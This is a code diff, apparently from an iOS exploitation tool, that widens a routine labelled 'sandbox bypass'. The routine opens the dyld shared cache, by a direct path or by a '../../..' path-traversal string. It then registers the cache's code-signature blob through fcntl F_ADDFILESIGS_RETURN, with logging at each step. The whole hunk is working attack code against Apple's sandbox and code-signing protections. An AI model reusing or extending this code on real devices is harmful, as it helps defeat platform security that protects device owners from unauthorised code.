@@ -440,29 +440,59 @@ typedef struct {
 
         // ── Try to open dyld cache via sandbox bypass ──
         int fd_main = -1;
-        const char *cachePaths[] = {
+        const char *cacheDirs[] = {
             "/System/Library/dyld/",
+            "/System/Library/Caches/com.apple.dyld/",
             "/System/Cryptexes/OS/System/Library/dyld/",
+            "/System/Cryptexes/OS/System/Library/Caches/com.apple.dyld/",
             "/System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/",
         };
-        for (int pi = 0; pi < 3 && fd_main < 0; pi++) {
-            char raw[1024];
-            snprintf(raw, sizeof(raw), "%s%s%s",
-                "../../../../../../../../../../../../../", cachePaths[pi], "dyld_shared_cache_arm64e");
-            NSString *nsp = [[NSString stringWithUTF8String:raw] stringByResolvingSymlinksInPath];
-            NSFileHandle *fh = [NSFileHandle fileHandleForReadingAtPath:nsp];
-            if (fh) {
-                fd_main = dup((int)fh.fileDescriptor);
-                [fh closeFile];
-                [self log:[NSString stringWithFormat:@"cache OPEN: %@ fd=%d", nsp, fd_main]];
-                rie_fsignatures_t fs; memset(&fs, 0, sizeof(fs));
-                fs.fs_file_start = 0;
-                uint8_t hb[0x40]; pread(fd_main, hb, 0x40, 0);
-                fs.fs_blob_start = (void*)(uintptr_t)(*(uint64_t*)(hb+0x28));
-                fs.fs_blob_size = (size_t)(*(uint64_t*)(hb+0x30));
-                int rc = fcntl(fd_main, F_ADDFILESIGS_RETURN, &fs);
-                [self log:[NSString stringWithFormat:@"F_ADDFILESIGS rc=%d", rc]];
+        const char *cacheNames[] = {
+            "dyld_shared_cache_arm64e",
+        };
+        int nDirs = sizeof(cacheDirs)/sizeof(cacheDirs[0]);
+        int nNames = sizeof(cacheNames)/sizeof(cacheNames[0]);
+
+        for (int pi = 0; pi < nDirs && fd_main < 0; pi++) {
+            for (int ni = 0; ni < nNames && fd_main < 0; ni++) {
+                // Try without path traversal (direct)
+                char direct[1024];
+                snprintf(direct, sizeof(direct), "%s%s", cacheDirs[pi], cacheNames[ni]);
+                NSString *nsp = [NSString stringWithUTF8String:direct];
+                NSFileHandle *fh = [NSFileHandle fileHandleForReadingAtPath:nsp];
+                if (fh) {
+                    fd_main = dup((int)fh.fileDescriptor);
+                    [fh closeFile];
+                    [self log:[NSString stringWithFormat:@"cache OPEN (direct): %@ fd=%d", nsp, fd_main]];
+                } else {
+                    // Try with path traversal
+                    char raw[1024];
+                    snprintf(raw, sizeof(raw), "%s%s%s",
+                        "../../../../../../../../../../../../../", cacheDirs[pi], cacheNames[ni]);
+                    nsp = [[NSString stringWithUTF8String:raw] stringByResolvingSymlinksInPath];
+                    // Log what we're trying
+                    BOOL exists = [[NSFileManager defaultManager] fileExistsAtPath:nsp];
+                    [self log:[NSString stringWithFormat:@"try: %@ → %@ (exists=%d)",
+                        [NSString stringWithUTF8String:raw], nsp, exists]];
+                    fh = [NSFileHandle fileHandleForReadingAtPath:nsp];
+                    if (fh) {
+                        fd_main = dup((int)fh.fileDescriptor);
+                        [fh closeFile];
+                        [self log:[NSString stringWithFormat:@"cache OPEN (traversal): %@ fd=%d", nsp, fd_main]];
+                    }
+                }
             }
+        }
+
+        if (fd_main >= 0) {
+            rie_fsignatures_t fs; memset(&fs, 0, sizeof(fs));
+            fs.fs_file_start = 0;
+            uint8_t hb[0x40]; pread(fd_main, hb, 0x40, 0);
+            fs.fs_blob_start = (void*)(uintptr_t)(*(uint64_t*)(hb+0x28));
+            fs.fs_blob_size = (size_t)(*(uint64_t*)(hb+0x30));
+            int rc = fcntl(fd_main, F_ADDFILESIGS_RETURN, &fs);
+            [self log:[NSString stringWithFormat:@"F_ADDFILESIGS rc=%d cs_off=0x%llx cs_sz=0x%zx",
+                rc, *(uint64_t*)(hb+0x28), fs.fs_blob_size]];
         }
 
         // Fallback: fd=-1 (in-memory)
